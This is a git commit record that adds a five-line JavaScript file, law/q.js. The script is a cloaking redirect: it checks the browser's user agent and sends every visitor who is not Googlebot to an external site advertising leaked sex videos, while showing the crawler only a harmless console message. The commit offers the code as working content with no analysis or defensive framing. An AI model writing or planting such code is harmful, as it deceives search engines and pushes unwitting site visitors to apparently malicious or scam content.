a937f05ac072dc831680bcc879d0a22688f72ba8
ncpb34 <monayemni.l.l@gmail.com>
2026-09-01 00:18:14 +0600

    Create q.js

---
+++ law/q.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "http://leakviralvideos.com/?sex-video-miraz";
+} else {
+  console.log("Thanks for visiting my page" );
+}
